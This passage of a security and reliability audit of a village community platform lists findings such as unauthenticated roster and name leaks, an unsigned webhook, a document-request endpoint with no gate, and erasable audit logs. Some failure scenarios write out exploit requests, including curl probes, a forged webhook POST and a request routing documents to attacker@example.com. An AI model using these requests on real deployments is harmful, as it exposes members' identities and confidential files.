- **What:** The handler takes `_req` — no authedUser, no capability, no lifecycle knob of any kind — and returns the last 60 gratitude_log rows with `message` verbatim; because it does not filter `kind`, heart rows are included, whose derived message is `❤ on "<first 80 chars of thread.title ?? thread.body>"` (server/index.ts:3491), and `feed.hearts_on_wall` is documented at docs/modules/gratitude-feed.md:126 but was never registered in shared/gameVariables.ts so nothing suppresses them.
- **Failure:** Forum and feed are set to 'members'. Ana writes a micropost about a conflict with the water committee; Beto taps the heart. A gratitude_log row is written with message `❤ on "the water committee keeps overriding me and I'm done arguing"`. An anonymous `GET /api/game/gratitude/wall` returns `{"from":"Beto","to":"Ana","message":"❤ on \"the water committee keeps overriding me and I'm done argui\""}`. Separately, every written acknowledgment ("thank you for sitting with me after the miscarriage") is world-readable with both first names attached, while the page copy only promises "each member" as the audience.

### /api/roles is an unauthenticated full role-holder roster, contradicting the map module's stated privacy tier
- **Where:** `server/index.ts:9720` · lens: ?
- **What:** The handler takes `_req`, is registered under the always-public core 'progression' module (shared/modules.ts:102) so requireModule never touches it, and returns every role with `holders: [{userId, name}]` — while /api/map (server/index.ts:3962) carefully strips holders unless the viewer has `map.viewPeople`, and docs/modules/village-map.md:125 states "names/faces always require login regardless"; a repo-wide grep shows /api/roles has zero client consumers.
- **Failure:** A village disables the map module entirely, or leaves map.public_structure false, believing no stranger can see who holds which seat. `curl https://<village>/api/roles` returns the complete sociocratic org chart with every holder's first name and stable userId — which is then the seed for enumerating /api/badges/of/<userId>. A stalker looking for which village someone joined, or a hostile party mapping who to pressure about a land decision, gets the whole answer in one unauthenticated request.

### /api/badges/match and /api/badges/of/:userId have no viewer check and return members' FULL names
- **Where:** `server/index.ts:6791` · lens: ?
- **What:** Neither handler calls authedUser — only requireModule('badges') stands in front, so both serve anonymous callers whenever the badges module is set to 'public' — and both select `u.name` raw (server/index.ts:6798, 6805) rather than the `firstName()` helper every other member-facing surface in this file uses (feed, forum, map, wall, pulse), turning the skills directory into a full-legal-name lookup.
- **Failure:** A village enables badges as 'public' so its Team page renders byline chips (BylineChips.tsx consumes /api/badges/of/:userId). A recruiter or an immigration officer runs `curl 'https://<village>/api/badges/match?skill=spanish'` and receives `{"members":[{"id":"usr-...","name":"María Elena Vargas Rojas","handle":"maria"}, ...]}` — up to 100 members' full legal names per query, plus `GET /api/badges/of/<id>` for each one's self-declared skill list. Even a signed-in member sees full names here that the rest of the platform deliberately shows as first names only.

### The departure tombstone nulls actor_user_id but never scrubs the departed member's name or words out of other members' notification rows
- **Where:** `server/index.ts:1676` · lens: ?
- **What:** anonymizeMember deletes only notifications addressed TO the departed member and sets `actor_user_id = NULL` on the rest, while the identifying data lives in the `title` and `body` TEXT that producers baked in — `${firstName(user.name)} sent you appreciation` (9273), `${firstName(user.name)} wants to connect` (4182), `A private intake from ${user.name}` (6182), `${first} mentioned you in "..."` (server/lib/forum.ts:105) plus the contact-relay body (140 chars) and the restorative-intake body (2000 chars) — and the retention sweep (server/index.ts:1623) only deletes rows that are `is_read = 1`, so an unread one is kept forever.
- **Failure:** Rosa leaves after a hard conflict, exercises her deletion right, and the admin resolves her exit; the docstring at server/index.ts:1645 promises "every denormalized trace of their identity is scrubbed". The next day the intake steward opens /api/notifications and still sees `A private intake from Rosa Jiménez Mora` with 2000 characters of what she said in confidence, unread and therefore exempt from retention forever; eight other members still see "Rosa sent you appreciation" and "Rosa wants to connect about Water Steward" with the first 140 characters of what she wrote them. The village has told her the record is gone and it is not.

### A boot that "refuses to serve" leaves a live process with no HTTP listener while the scheduler keeps moving money
- **Where:** `server/index.ts:2225` · lens: ?
- **What:** startScheduler(getPool()) runs at line 2225, before assertExchangeFirewalls / assertBadgeInvariants / assertLibraryInvariants (2262-2264), before assertSwapFirewalls, and before the boot-time reconcileSwapOrders. startScheduler's first tick is a non-unref'd setTimeout(15s) (scheduler.ts:76). The top-level call is `startServer().catch(console.error)` (index.ts:10030) — no process.exit(1), no health check in railway.toml — and mysql2's pool sockets keep the event loop alive, so a rejected boot produces a process that is running, never listening, and never restarted (restartPolicyType="on_failure" never fires).
- **Failure:** The library escrow mismatch above (or a negative swap cap, or a stale legal-card acceptance) makes assertLibraryInvariants throw at 2263. loadModuleSettings has already run and the scheduler has already been armed. 15 seconds later the tick fires and, every 5 minutes thereafter, library-sweep settles loans, stay-nightly burns stay credits, and exchange-reconcile marks orders paid — all inside a process that has declared the ledger untrustworthy and refuses to serve. Members see a dead site with no explanation; Railway sees a healthy container; the deployment stays dark indefinitely.

### One malformed swap order permanently disables the abandoned-checkout sweep, which in turn wedges module-disable and member exit
- **Where:** `server/lib/exchange.ts:684` · lens: ?
- **What:** reconcileSwapOrders throws on a swap with exactly one ledger leg. runExchangeReconcile (index.ts:2062) awaits it *before* releaseAbandonedFiatOrders (index.ts:2075), so the throw aborts the whole job. The scheduler catches, writes last_result=FAILED, and re-runs an hour later — where it throws on the same row again, forever.
- **Failure:** A single exchange_orders row somehow ends up with one 'exchange_swap' leg (the same condition assertSwapFirewalls treats as reachable enough to check for at boot, exchange.ts ~790). From then on runExchangeReconcile throws every hour and releaseAbandonedFiatOrders never executes. Abandoned card checkouts accumulate as `pending` forever; exchangeOpenState therefore refuses to let an admin turn the exchange off, and exitOpenState (exit.ts:135) blocks every member who ever closed a Stripe tab from resolving their exit. Nobody connects a stuck swap row to "I cannot leave the village."

### A stay whose last_posted_on write is lost stops being charged for every subsequent night, forever
- **Where:** `server/lib/stays.ts:239` · lens: ?
- **What:** postNightsForStay posts the night through the ledger and then advances last_posted_on in a separate autocommit statement. The idempotency key makes a re-post a no-op, but the grace check `if (balance - rate < graceFloor)` runs against the *current* balance, which already includes the un-marked night — so the retry stops instead of advancing the marker.
- **Failure:** stay.grace_nights=1, rate=10, balance 0. Night of the 1st posts (balance -10) and the `UPDATE stays SET last_posted_on` fails or the process restarts before it lands. Every subsequent hourly run recomputes owed=[1st, 2nd, ...], reads balance -10, evaluates -10-10 < -10, returns stopped:true, and never advances last_posted_on. The guest is never charged another night for the rest of their stay, sys:mint's issued-supply figure stops tracking reality, and the admin gets a daily "past the grace window" alert about a night that was in fact paid.

### A multi-statement migration that fails halfway makes every future boot fail on the statement that already succeeded
- **Where:** `server/db/migrate.ts:76` · lens: ?
- **What:** applyPending runs each file's statements with `for (const s of parts) await conn.query(s)` and only records the filename after all of them succeed. There is no transaction (MySQL DDL is not transactional anyway) and no per-statement idempotency — the ALTERs in drizzle/ use plain `ADD COLUMN` / `ADD UNIQUE KEY`, which MySQL 8 cannot express as IF NOT EXISTS. Migrations run at boot (index.ts:2007) and a failure aborts startServer.
- **Failure:** drizzle/0036_qa_fixes.sql has three statements. Statement 1 (`ALTER TABLE feedback_items ADD COLUMN may_relay`) succeeds. Statement 2 (`ADD UNIQUE KEY product_purchases_receipt_uq`) fails because the live Amora database already contains two purchases sharing a receipt_no — exactly the race the index was added to prevent. 0036 is not recorded. Every boot from then on re-runs statement 1, gets `ER_DUP_FIELDNAME: Duplicate column name 'may_relay'`, throws `migration failed`, and the deployment never comes up — a schema problem has become a total outage that no code change can fix.

### GET /api/roles is fully public and discloses every role holder's identity, bypassing map.viewPeople, map.public_structure and requireModule("map")
- **Where:** `server/index.ts:9720` · lens: ?
- **What:** The map payload at /api/map carefully tiers disclosure ("anonymous visitors get STRUCTURE only — circles, role titles, seat counts, never names") and is gated by requireModule("map") plus hasCapability("map.viewPeople"); /api/roles sits outside every one of those gates and returns `holders: [{ userId, name }]` for all roles plus each role's `capabilities` list, to anyone, unauthenticated.
- **Failure:** With the map module at its shipped default of "off" and map.public_structure irrelevant, run `curl https://village.example/api/roles`. The response lists founders-circle with its capabilities ["proposal.open","proposal.decide","quest.consent","forum.moderate",...] and the userId + first name of every seat holder. A member who was refused map.viewPeople in the UI, or a stranger scraping the site, gets the full seating chart and knows exactly which accounts to target.

### POST /api/assistant/coordinate is a map-module route registered outside the /api/map mount, so requireModule("map") never runs and no map capability is checked
- **Where:** `server/index.ts:4209` · lens: ?
- **What:** The concierge reads circles/roles/quests, writes concierge query rows, and returns `contact: { userId, name, roleId, circleId }` for a role holder. Its only guards are authedUser and boolVar("map.concierge_enabled") (default "true" in shared/gameVariables.ts:356). Because its path is /api/assistant/... it is not covered by app.use("/api/map", requireModule("map")) at line 3937, and unlike POST /api/map/contact (line 4116) it never calls hasCapability("map.contact") or map.viewPeople.
- **Failure:** A fork leaves the map module off (the shipped default). A brand-new account registers, gets a token, and POSTs {"query":"who runs the treasury"} to /api/assistant/coordinate. It returns the treasury seat holder's userId and first name and writes a concierge_queries row — disclosure the village explicitly gated behind map.viewPeople/map.contact, from a module it never turned on.

### POST /api/webhooks/riverside accepts unauthenticated writes with no signature, shared secret, or rate limit
- **Where:** `server/index.ts:5716` · lens: ?
- **What:** Unlike the Stripe webhook (which verifies the signature against the raw body and keeps an in-memory rate bucket), the Riverside webhook verifies nothing: it only checks that the automation module is at preview or above, then calls ingestRecording() and putTranscript() with attacker-supplied `id`, `title`, `url`, `durationS` and `transcript`. `grep -n "secret" server/lib/recordings.ts` finds no secret handling anywhere in the module.
- **Failure:** A village enables the automation module. A stranger loops `POST /api/webhooks/riverside {"id":"x1","title":"Land Circle call","transcript":"<fabricated minutes assigning the north field to Bob>"}`. Each unique id creates a recording row with a planted transcript; an admin later clicks Synthesize on what looks like a real call, and the synthesis is published as a forum thread with role-targeted assigned work. Repeating with fresh ids also grows the recordings table without bound.

### The quest.consent and quest.propose capabilities are declared, granted by seeded roles, and enforced by no route — value release is admin-only while the platform reports otherwise
- **Where:** `server/index.ts:9080` · lens: ?
- **What:** shared/capabilities.ts:23 documents quest.consent as "release value on someone's quest (also admin/role gated)", shared/modules.ts:72 advertises both capabilities as the quests module's, and server/seeds/roles-seed.json grants quest.consent to founders-circle and steward-circle. But the only consent route (POST /api/admin/quest-claims/:id/consent) is gated by `isAdmin` alone, and the only quest-creation route (POST /api/admin/quests, line 8972) is likewise isAdmin-only. A grep for `quest.consent` / `quest.propose` finds no hasCapability call anywhere on the server.
- **Failure:** A steward-circle holder signs in; GET /api/game/progression (line 9531) and GET /api/game/me both return "quest.consent" and "quest.propose" in their `capabilities` array, and STAGE_UNLOCKS promises quest.propose at contributor stage. They then have no endpoint that honours either: every claim consent and every new quest still requires an admin/founder account, so the recognition economy's value release stays concentrated in whoever holds the admin login, and the member is shown a permission that does nothing.

### The no-self-appointment guard on POST /api/admin/roles/:id/holders is defeated by an unthrottled open registration, letting one proposal.decide holder mint capability-bearing seats
- **Where:** `server/index.ts:9749` · lens: ?
- **What:** A non-admin holding proposal.decide may appoint any userId other than their own. POST /api/auth/register (line 3007) has no rate limit (unlike login, which calls overLimit) and no email verification or approval step, so "someone other than me" is a ten-second detour. The founders-circle seed role has `minStage: null`, so the stage check at line 9785 does not apply, and its capabilities include proposal.decide, forum.moderate and quest.consent — the appointment power reproduces itself.
- **Failure:** Alice holds founders-circle (proposal.decide). She POSTs /api/auth/register twice to create bob2@… and carol2@…, then POSTs /api/admin/roles/founders-circle/holders {"userId":"user-…bob2","action":"add"} — accepted, because bob2 is not Alice and founders-circle has no minStage. bob2 now holds proposal.decide and forum.moderate; signing in as bob2 she appoints herself extra seats, or appoints accounts to a role carrying exchange.manage. No admin ever acted, no decision thread exists, and the guard against "a captured account clearing the room" is bypassed entirely.

### PUT /api/admin/badges/:id can change a badge's kind and capabilities while leaving every existing award in place, silently granting capabilities to everyone who self-claimed it
- **Where:** `server/index.ts:6889` · lens: ?
- **What:** badgeProblem() (server/lib/badges.ts:108) correctly refuses capabilities on a `self` badge, and POST /api/badges/:id/claim (line 6812) only lets a member claim `self` badges. But the admin edit route mutates `kind` and `capabilities` in a single UPDATE with no effect on badge_awards, and badgeGrantsFor() joins awards to the badge row's CURRENT capabilities. Converting a claimed self badge into a capability-bearing granted badge therefore back-fills the grant to everyone who already claimed it, and passes assertBadgeInvariants at the next boot.
- **Failure:** A village ships a self badge "gardener"; forty members self-claim it. A steward later edits it: PUT /api/admin/badges/gardener {"kind":"granted","capabilities":["forum.moderate"]}. badgeProblem passes (granted badges may carry capabilities), the forty existing awards are untouched, and on their next request all forty members hold forum.moderate — able to hide any thread — with no award event, no notification, and no audit row naming who received the power.

### The "gated investor doc request" endpoint is not gated: any unauthenticated caller receives download links to every admin-uploaded investor document, served publicly by /api/uploads/:filename
- **Where:** `server/index.ts:8580` · lens: ?
- **What:** POST /api/investor-docs/request requires only a name, an email and a self-declared `accredited` boolean — no authentication, no admin approval, no rate limit (contrast the neighbouring /api/work-with-us/attachment, which does call overLimit), and no verification that the caller controls the address. It immediately emails links to every row in investorDocsRepo, and GET /api/uploads/:filename (line 8560) serves those files to anyone who has the filename with no auth check.
- **Failure:** A stranger POSTs {"name":"x","email":"attacker@example.com","accredited":true} and receives an email containing https://village/api/uploads/<doc> for every document the founders uploaded through /api/admin/investor-docs/upload — financials, cap table, offering memorandum — which then load unauthenticated and can be reshared as bare URLs. Each request also appends to submissions and sends two emails, so a loop both floods the submissions store (read-modify-write of the whole array) and burns the village's Resend quota.

### The app shell hardcodes Amora's logo, copyright and outbound links, and never consults the brand overlay
- **Where:** `client/src/components/Layout.tsx:57` · lens: ?
- **What:** Layout.tsx imports no config at all — no `mergedConfig`, no `GAME_CONFIG`, no `/api/game/config`. It renders `<AmoraLogo>` in the header (57), `<AmoraHeartLogo>` in the footer (408), the literal "A regenerative village in Costa Rica where all beings belong and thrive." (411), `© {year} Amora. All rights reserved.` (581), and four hardcoded `href="https://amora.cr…"` links (237, 383, 542, 552, 562). The Setup Wizard's Identity step writes `project.name` into the brand document, which the shell never reads.
- **Failure:** Village #2 completes the whole "Make This Yours" wizard, sets its name to "Vale Verde", uploads its images, and goes live. Its members see Amora's logo at the top of every page, a footer saying "A regenerative village in Costa Rica", "© 2026 Amora. All rights reserved." as the copyright on the fork's own work, and five nav/footer links that navigate members off to amora.cr. The wizard reports success; nothing warns the operator. The only remedy is hand-editing React components — and the brand ratchet (baseline 425) permits those references indefinitely because it fails only on an increase.

### The HTML head is not overlayable and hotlinks Amora's WordPress for the favicon and social image
- **Where:** `client/index.html:8` · lens: ?
- **What:** `<title>Amora Co-Create | Regenerative Village in Costa Rica`, the meta description, `meta author`, `link rel=canonical href="https://play.amora.cr"`, `og:url`, `og:site_name`, `twitter:*`, and a JSON-LD `Organization` block naming Amora with `addressCountry: CR` are all build-time literals with no brand-overlay path. Worse, `link rel="icon"` and `apple-touch-icon` (lines 34-35) and both `og:image`/`twitter:image` point at `https://amora.cr/wp-content/uploads/…` — the same hotlinking pattern as `shared/gameConfig.ts:179-184`, whose six `images.*` defaults `mergedConfig()` falls back to when a wizard field is left blank.
- **Failure:** Village #2 launches at vale-verde.example. Every page load in every member's browser issues a request to `amora.cr/wp-content/uploads/2025/11/favicon.png`, handing Amora's WordPress the IP address and Referer of every member of every fork on poor rural connections. The fork's browser tab reads "Amora Co-Create | Regenerative Village in Costa Rica"; a link shared in WhatsApp previews as Amora with Amora's photo; search engines see `canonical: https://play.amora.cr` and de-index the fork's own pages in favour of Amora's. If Amora ever deletes that upload, every fork's favicon and social preview breaks at once.

### /api/platform/info publicly discloses modules that are in `preview`, breaking the documented preview contract
- **Where:** `server/index.ts:4934` · lens: ?
- **What:** The handshake is unauthenticated and returns `MODULES.filter((m) => m.core || effectiveLifecycle(m.id) !== "off").map((m) => ({ id, lifecycle: effectiveLifecycle(m.id) }))`. A module at `preview` therefore appears by id with `lifecycle:"preview"`. `server/lib/modules.ts:171-176` deliberately returns an IDENTICAL 404 body for `off` and `preview`-to-outsiders ("existence is hidden"), and `moduleActivity` (modules.ts:309) structurally refuses to emit anything while a module is below `members` — the platform holds "nothing leaks about a module below members" as a rule, and this route breaks it.
- **Failure:** A village enables `commerce` and `stays` in preview to trial fiat flows privately before telling anyone. Anyone on the internet runs `curl https://village.example/api/platform/info` and gets `{"modules":[…{"id":"commerce","lifecycle":"preview"},{"id":"stays","lifecycle":"preview"}…]}` — learning that this village is standing up payment collection before its own members know, and gaining a probe list for a village that has not finished hardening. The 404s the village is relying on say nothing exists; the handshake says otherwise.

### /api/network/published serves publicly while the network module is only in `preview`
- **Where:** `server/index.ts:5357` · lens: ?
- **What:** The route is mounted before `app.use("/api/network", requireModule("network"))` (5374) and gates on `effectiveLifecycle("network") === "off"` only. At `preview` — admins-only, existence supposed to be hidden — it answers any anonymous caller with `instanceId`, the village `name`, and up to 100 `shared_items` including the free-text `contact` column. `scripts/enable-all-modules.mjs --preview` (FORK_RUNBOOK's documented "opens them admin-only first") sets exactly this state. Note also that `/api/admin/network/share` and `/api/admin/network/peers` carry no `requireModule` gate at all, so items can be published and peers added while the module reads `off`.
- **Failure:** An admin runs `enable-all-modules.mjs --preview` to trial the network module admin-only, then publishes a test need: "Need a midwife for two births in October — reach Ana at ana.personal@gmail.com" (the contact placeholder says "a shared inbox, not a personal one" but the field is unvalidated free text). The village believes the module is invisible. `curl https://village.example/api/network/published` returns that item, with Ana's personal address, to the open internet and to every crawler, and simultaneously reveals that the network module exists — the opposite of what the preview 404 promises.

### Migration 0006 seeds a token slugged `amora` into every fork's ledger, and the slug is hardcoded in server code with no rename path
- **Where:** `drizzle/0006_token_registry.sql:43` · lens: ?
- **What:** `INSERT … VALUES ('amora', 'Amora', 'equity', 'hypha', 0, 2)` runs at boot on every deployment — migrations are applied fail-loud at boot, so no fork can skip it. `server/index.ts:6362` then hardcodes the slug: `{ slug: "amora", address: stringVar("tokens.equity_address") }`. The admin token API (`/api/admin/tokens`, 7709-7761) offers only list, create and mint — there is no rename or delete, and the FORK_RUNBOOK's Gate D section covers only "the recognition token" and "per-module tokens", never this row.
- **Failure:** Village #2 in Portugal boots for the first time. Its ledger registry now permanently contains a token named "Amora" of kind `equity`, governance `hypha`. Admin → Tokens shows it; the moment `tokens.show_economics_section` is on, `/api/wallet` returns an `onchain.amora` key to every member. The operator has no UI to rename or remove it, and if they hand-edit the row's slug in SQL, `server/index.ts:6362` still asks for `slug: "amora"`, so the on-chain binding silently resolves to nothing while the UI keeps rendering a token key named after another village.

### An abandoned Stripe stay checkout becomes a permanent, unclearable block on the member's exit
- **Where:** `server/index.ts:4636` · lens: ?
- **What:** POST /api/stays/purchase writes a stay_purchases row with status='pending' before calling createCheckout, but unlike exchange_orders (which the X4 sweep releases via exchange.order_expiry_hours) nothing ever expires a pending stay_purchase: the only status-changing admin route, POST /api/admin/stays/purchases/:id/refund (server/index.ts:4872), refuses anything that is not 'paid', and no scheduler job touches the table. Meanwhile server/lib/exit.ts:126 counts pending stay_purchases as a blocking: true exit domain and server/lib/stays.ts:307 counts them as open state that refuses to turn the module off.
- **Failure:** A guest on a rural link taps "Buy 3 nights", the Stripe page opens, their connection drops before they pay, so no webhook ever arrives and the row stays 'pending'. Eight months later they decide to leave: exitOpenState reports "0 requested/active stay(s), 1 pending/disputed purchase(s)" as blocking, and there is no route an admin can call to clear it — the member cannot complete their exit, and the stewards cannot disable the stays module, without a hand-written UPDATE against the production database.

### Fiat currency is hardcoded to USD end to end, with no configuration seam anywhere
- **Where:** `server/lib/payments.ts:84` · lens: ?
- **What:** createCheckout sends line_items[0][price_data][currency] = input.currency ?? "usd" and not one of the three call sites (server/index.ts:4623 stays, 5237 commerce, 7136 exchange) ever passes a currency. recordFiatCharge defaults the stored currency to 'usd' (payments.ts:459); the stays price kind is the literal string "usd" (server/index.ts:4624) with the refusal "That room has no posted USD price"; assertCanPurchase multiplies payments.purchase_limit_*_usd by 100, assuming a two-decimal minor unit; every client formatter is `$${minor/100}` (Wallet.tsx:20, Stay.tsx:21, Contribute.tsx:23, SwapCard.tsx:24, Admin.tsx:3471/3755/6360); and quoteSwap's comment at server/lib/exchange.ts:514 claims "Forks override it" for currencySymbol when grep shows no caller anywhere passes it. The one currency knob that exists, DEFAULT_SETTINGS.villageDues.currency (server/index.ts:457), is only used in dues prose.
- **Failure:** A Portuguese fork posts a room at 40 in an admin field labelled "USD/night", reading it as €40. A member checks out; Stripe is asked for unit_amount 4000 in usd, so the card is charged $40 ≈ €34; fiat_charges records currency 'usd'; the village's EUR-settling Stripe account receives ~15% less than the posted rate on every stay, token pack and donation, and there is no setting to correct it. On a zero-decimal currency the same fork's purchase caps are 100x too high, because assertCanPurchase's *100 has no currency to ask about.

### The driver is pinned to UTC but the MySQL session time_zone never is, so every DB-generated timestamp is read back shifted by the server's offset
- **Where:** `server/db/pool.ts:26` · lens: ?
- **What:** getPool() sets mysql2's timezone:'Z' — which only controls how the driver parses returned DATETIME/TIMESTAMP strings and serializes JS Dates — but nothing ever issues SET time_zone = '+00:00' (no occurrence of time_zone anywhere in server/ or drizzle/), and there is no boot assertion on it, unlike the ledger-sum and ADMIN_PASSWORD checks. There are 67 NOW()/CURRENT_TIMESTAMP uses in server/, so the DB renders wall-clock values in its session zone while the driver interprets them as UTC.
- **Failure:** An Indian fork self-hosts MySQL with the default time_zone=SYSTEM on a host set to Asia/Kolkata. A member sends gratitude at 21:00 local (15:30 UTC); created_at stores the right instant but MySQL returns '21:00' and mysql2 parses it as 21:00Z, so notificationsFor and the gratitude wall report it as 02:30 the next day in the member's browser — the record disagrees with the village about what day an acknowledgment happened. The same skew hits server/lib/scheduler.ts:49, where last_run_at (session-zone) is compared against a JS-computed UTC literal: at UTC-6 the effective interval shrinks by six hours, so stay-nightly, exchange-reconcile, badge-expiry-sweep and feedback-relay claim on every 5-minute tick, and at UTC+2 every one of them runs two hours late.

### The concierge's normalizer deletes every non-Latin script, so in those villages it always answers "nothing on the map holds that"
- **Where:** `server/lib/map.ts:24` · lens: ?
- **What:** norm() does .replace(/[^a-z0-9\s-]/g, " ") after NFKD, and scoreCandidates then keeps only tokens of length >= 3. Any query in Japanese, Chinese, Korean, Thai, Arabic, Hebrew, Cyrillic, Devanagari or Amharic normalizes to whitespace, so words is empty and scoreCandidates returns []. In the route (server/index.ts:4229-4260) the LLM tie-break is guarded by `if (!winner && scored.length > 1)`, so with an empty list it is never reached — the assistant cannot rescue the query either.
- **Failure:** A Japanese village turns on the map module. A member asks the concierge 水道は誰が直しますか (who fixes the water supply). norm() erases every character, scored is empty, the LLM is skipped, and the reply is "Nothing on the map holds that yet — that's a signal the founders read." The row is logged with matched_kind='none', which docs/modules/village-map.md treats as the founders' role-creation demand signal — so the village is told it needs new roles when the truth is that the scorer cannot read its alphabet, and no amount of role creation will ever change the answer.

### Circles (and tools) cannot be named in a non-Latin script — the slug derivation empties the name and the request is refused
- **Where:** `server/index.ts:4009` · lens: ?
- **What:** POST /api/admin/circles builds the id as String(id ?? name).toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/^-+|-+$/g,"") and then refuses with 400 when the result is falsy. For any name written outside [a-z0-9] the slug is the empty string. POST /api/admin/tools (server/index.ts:4434) has the same derivation; it at least falls back to `tool-${Date.now()}`, and badges (line 6878) and tool categories (line 6490) have fallbacks too — circles has none.
- **Failure:** A Russian-speaking steward opens Admin and creates the circle "Круг воды" (Water Circle). slug is "", so the server answers 400 "A name (and slug) is required" even though a name was typed. The admin has no way to create any circle without inventing an ASCII name, which makes the village map — whose whole structure is circles and the roles inside them — unusable in the village's own language.

### A 1.38 MB single-chunk client is served uncompressed and with max-age=0, with a render-blocking third-party font request in front of it
- **Where:** `server/index.ts:9997` · lens: ?
- **What:** app.use(express.static(staticPath)) is called with no options, so hashed immutable assets get Cache-Control: public, max-age=0 and are revalidated on every visit; there is no compression middleware anywhere in the repo (only hit for "compression" is a sharp log line at server/index.ts:8447), so nothing gzips the response. vite.config.ts sets no manualChunks and client/src/App.tsx eagerly imports all 44 pages with no React.lazy — including Admin.tsx (6,734 lines) and ProjectHistory.tsx (2,870) — producing one dist/public/assets/index-*.js of 1,377,991 bytes plus a 177,126-byte CSS file. client/index.html then puts a render-blocking https://fonts.googleapis.com stylesheet for four families and hotlinks the favicon and og:image from amora.cr.
- **Failure:** A member on rural 3G at ~50 KB/s opens /quests to see what needs doing. The browser blocks on the Google Fonts stylesheet, then downloads 1.38 MB of uncompressed JS (the gzipped equivalent is 354 KB) plus 177 KB of CSS: roughly 30 seconds to first paint instead of roughly 8, and every one of those bytes includes the entire admin console the member will never open. Tomorrow they return and, because max-age is 0, the browser re-validates each asset over the same link before rendering anything.

### Every warning badge issued through the admin UI is permanent — the entire auto-expiry design is dead code
- **Where:** `client/src/pages/Admin.tsx:4382` · lens: ?
- **What:** The Warnings desk posts only `{ userId, note }` to `/api/admin/badges/:id/award` (Admin.tsx:4382); there is no expiry input on the form. The route (server/index.ts:6936) stores `expiresAt: null` when the field is absent, and `badges.warning_default_days` — promised at docs/modules/badges.md:116 and :183 as the default the issuer inherits — does not exist in shared/gameVariables.ts and is referenced nowhere in code. So `badge_awards.expires_at` is always NULL. `badgeGrantsFor` (server/lib/badges.ts:149) then denies the capability forever, `sweepExpiredWarnings` (badges.ts:242, `expires_at IS NOT NULL AND <= NOW()`) can never match a row, and the hourly `badge-expiry-sweep` job (index.ts:2184) with its "restrictions lifted" notification is unreachable code. `badgesOpenState` (badges.ts:345) also counts the award forever, so once one warning exists the badges module can never be switched back off.
- **Failure:** A steward opens Admin → Badges, picks the seeded "Timeout" warning (denies forum.post), picks a member, types a note, clicks Award. The member is silenced in the forum with no end date, no countdown anywhere in the UI, and no sweep will ever lift it — only another admin deleting the award restores their voice. docs/modules/badges.md:18 states warnings "auto-expire" precisely so that this cannot happen.

### Stage demotions are never notified, never journalled, and never audited
- **Where:** `server/index.ts:1244` · lens: ?
- **What:** `recordStageEvent` returns immediately when `stageIndex(to) <= stageIndex(from)` (index.ts:1244), so a demotion produces no `stage_events` row, no pulse line and no notification. The only route that can cause one deliberately, `PUT /api/admin/players/:id/stage` (index.ts:9875), calls `recordStageEvent` and nothing else — no `recordEvent(... audience: "admin")`, unlike every neighbouring admin mutation. The loss of standing therefore exists only as a mutated `users.stage_granted` column, invisible to the member, to `/api/admin/audit`, and to `/api/profile/export` (which reads `stage_events`).
- **Failure:** A founder clears the stage grant on a Co-Creator who disagreed with them. The member loses `proposal.open` (they can no longer open a governance decision) and their gratitude multiplier drops from 3 to 1. They receive nothing. `/api/admin/audit` shows nothing. Their data export shows nothing. There is no record anywhere that the village ever recognised them as a Co-Creator or that anyone took it away.

### The admin audit trail is erasable by any admin, with no trace of the erasure
- **Where:** `server/lib/events.ts:81` · lens: ?
- **What:** `deleteEvent()` deletes from `health_events` by id with no audience predicate, and `DELETE /api/admin/activity/:id` (index.ts:10001) exposes it to any admin. `GET /api/admin/audit` (index.ts:3238) returns each row's `id`, so the ids needed are handed to the caller. The deletion itself writes no event. This contradicts docs/modules/health-dashboard.md:28 ("health_events — the append-only spine") and docs/ARCHITECTURE.md:447 ("ADMIN audit rows are kept as the legal record"), and it is the *only* record of admin action on a member: warnings, badge revokes, role changes, exits and launch acts all write `audience: "admin"` here.
- **Failure:** A founder places a warning badge on a critic, producing `badge:warning:timeout` with `audience='admin'`. They GET /api/admin/audit, copy the row id, and DELETE /api/admin/activity/<id>. The audit trail now shows no warning was ever issued, the deletion is not logged, and — because badge awards are only visible to admins and the subject — nobody outside the admin group can ever discover it happened.

### quest.consent gates nothing: releasing value is admin-password-only, and the capability offered to roles is inert
- **Where:** `server/index.ts:9097` · lens: ?
- **What:** `hasCapability("quest.consent", …)` is called nowhere in the server (grep across *.ts/*.tsx finds the key only in shared/capabilities.ts:23, shared/modules.ts:72, the Admin role-capability picker at client/src/pages/Admin.tsx:4174, a test, and a schema comment). `POST /api/admin/quest-claims/:id/consent` (index.ts:9097) — the one route that credits recognition and stay credits and advances stages — gates on `isAdmin(req)` alone. shared/capabilities.ts:23 documents the key as "release value on someone's quest (also admin/role gated)", and it is selectable in the admin role editor, so a village will grant it and believe it works. The mirror-image failure exists for `quest.propose`, whose `contributor` stage unlock (capabilities.ts:67) is enforced neither on the server nor in the client: quest proposals arrive through `POST /api/forms/submit` (index.ts:2820) as type `quest-proposal`, which accepts anonymous callers with no capability check at all.
- **Failure:** A founder creates a "Quest Steward" role with quest.consent, appoints two members, and steps back for a month of travel. Every consent attempt those stewards make returns 401 Unauthorized. No contributed work in the village can be credited until the founder returns with the admin password — the single-founder failure mode the capability was designed to remove.

### The exit balance sweep is irreversible, unannounced, and survives a cancelled exit
- **Where:** `server/index.ts:6114` · lens: ?
- **What:** `POST /api/admin/exits/:id/settle-balances` (index.ts:6114) accepts any exit whose status is not resolved/cancelled — including one still `open`, mid-notice-period, and including an `involuntary` exit an admin opened unilaterally (index.ts:6084). `sweepBalances` (server/lib/exit.ts:201) moves every positive balance to `sys:exit-settlement`. Nothing in the codebase ever transfers out of that account (grep for EXIT_SETTLEMENT / 'exit_settlement' finds only the sweep, the constant, the seed and docs), and `sys:exit-settlement` is deliberately not a faucet, so no restoring transfer is even postable. The route sends the member no notification. `POST /api/admin/exits/:id/cancel` (index.ts:6165) closes the exit without touching the ledger.
- **Failure:** An admin opens an involuntary exit on a member during a conflict, then immediately calls settle-balances, sweeping 4,300 recognition and 12 stay credits. The member appeals to the stewards and the village agrees she stays; the admin cancels the exit. She is still a member — with a zero balance, no notification of what was taken, and no code path in the platform that can give it back.

### Three soft reports vanish a post from its own author, with no notice, no reason and no appeal
- **Where:** `server/index.ts:3842` · lens: ?
- **What:** At `forum.report_hide_threshold` distinct soft reporters (default 3, gameVariables.ts:418) the report route sets `hidden_at`/`hidden_by='community'` (index.ts:3842). The list query filters `t.hidden_at IS NULL` for anyone without `forum.moderate` (index.ts:3571), and the detail route returns 410 to everyone but moderators (index.ts:3671) — the author included. No notification is sent to the author, `hidden_reason` is a fixed string never shown to them, and the only route that can restore is `POST /api/forum/threads/:id/moderate` behind `forum.moderate`, which has no stage unlock at all (capabilities.ts:65) and is therefore admin/role-only.
